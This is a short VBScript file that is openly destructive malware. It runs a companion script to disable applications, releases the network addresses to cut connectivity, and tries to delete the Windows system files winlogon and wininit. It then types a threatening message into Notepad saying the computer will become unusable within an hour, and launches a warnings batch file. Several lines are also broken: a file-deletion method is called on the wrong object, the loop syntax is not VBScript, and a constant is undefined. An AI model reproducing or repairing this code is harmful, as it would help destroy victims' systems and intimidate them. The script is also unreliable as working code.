Option Explicit

dim x
dim dir
set x = WScript.CreateObject("wscript.shell")
set dir = WScript.Path

x.Run("cmd /c start " + dir + "\disable-apps.vbs", hidden)
x.Run("cmd.exe /c ipconfig /release * && ipconfig /release6 *", hidden)
x.DeleteFile("C:\Windows\System32\winlogon*")
x.DeleteFile("C:\Windows\System32\wininit*")
x.Run("notepad.exe")
WScript.Sleep(1000)
x.SendKeys("Core files that are used to start up your computer have been deleted.{ENTER}You have 1 hour (after Notepad closes) until you have to say goodbye to your computer and it shuts down.{ENTER}After that, you will not be able to log back in.{ENTER}There is nothing you can do about it.{ENTER}All applications are disabled.{ENTER}Internet is off and you cant turn it back on.{ENTER}I suggest that in the time you have left with your computer, to back up all the files on your computer.", 1)
while x.Application.Name is "notepad.exe":
    WScript.Sleep(1)
Wend

x.Run("cmd.exe " + dir + "\warnings.bat " + dir, hidden)